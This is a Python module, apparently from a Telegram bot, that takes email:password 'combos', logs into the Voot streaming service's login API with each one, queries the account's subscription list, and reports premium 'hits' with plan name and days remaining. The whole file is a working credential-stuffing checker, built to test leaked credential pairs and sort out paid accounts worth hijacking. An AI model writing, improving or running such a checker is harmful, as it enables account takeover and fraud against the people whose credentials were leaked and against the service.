import requests
from message import Sendmessage, Editmessage, logger
from datetime import datetime


head = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'content-type': 'application/json;charset=UTF-8',
}

def Voot_helper(chat_id, combo):
    status = Sendmessage(chat_id, '<i>Checking...</i>')
    try:
        combo_split = combo.split(':')
        inpumail = combo_split[0]
        inpupass = combo_split[1]
    except IndexError:
        return Editmessage(chat_id, 'Enter Valid Combo😡😡', status)
    session_requests = requests.session()
    email = f'"email": "{inpumail}"'
    password = f'"password":"{inpupass}"'
    payload = '{"type":"traditional","deviceId":"X11","deviceBrand":"PC/MAC","data":{%s,%s}}' % (
        email, password)

    login_url = "https://userauth.voot.com/usersV3/v3/login"

    result = session_requests.post(login_url, data=payload, headers=head)
    response = result.json()
    if result.status_code != 200:
        logger.info('Login Failed')
        code = response['status']['code']
        msg = response['status']['message']
        text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Error\nCode: {code}\nMessage: {msg}\nSite: Voot</b>'
        Editmessage(chat_id, text, status)
        return
    acess = response['data']['authToken']['accessToken']
    head2 = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'accesstoken': str(acess),
    }
    subs_url = 'https://pxapi.voot.com/smsv4/int/ps/v1/voot/transaction/list'
    response = session_requests.get(subs_url, headers=head2)
    result = response.json()
    total = result['results']['total']
    if int(total) == 0:
        free_text = f'<b>Expired Combo ❌</b>\n<b>Site: Voot</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Expired</b>'
        Editmessage(chat_id, free_text, status)
        return
    pay_list = result['results']['list'][0]
    ts = int(pay_list['endDate']['timeStamp'])
    print(ts)
    try:
        human = datetime.utcfromtimestamp(ts)
    except ValueError:
        human = datetime.fromtimestamp(ts/1000.0)
    expire = human < datetime.today()
    if expire:
        expire_text = f'<b>Expired Combo ❌</b>\n<b>Site: Voot</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Expired</b>'
        Editmessage(chat_id, expire_text, status)
        return
    Pack_name = pay_list['itemDetails']['name']
    Pack_recur = pay_list['itemDetails']['isRenewable']
    days = human - datetime.today()
    pro_message = f'<b>🌟 Hit Combo 💫</b>\n<b>Site: Voot</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Premium\nPlan: {Pack_name}\nDays Left: {days.days}\nRecurring: {Pack_recur}</b>'
    Editmessage(chat_id, pro_message, status)


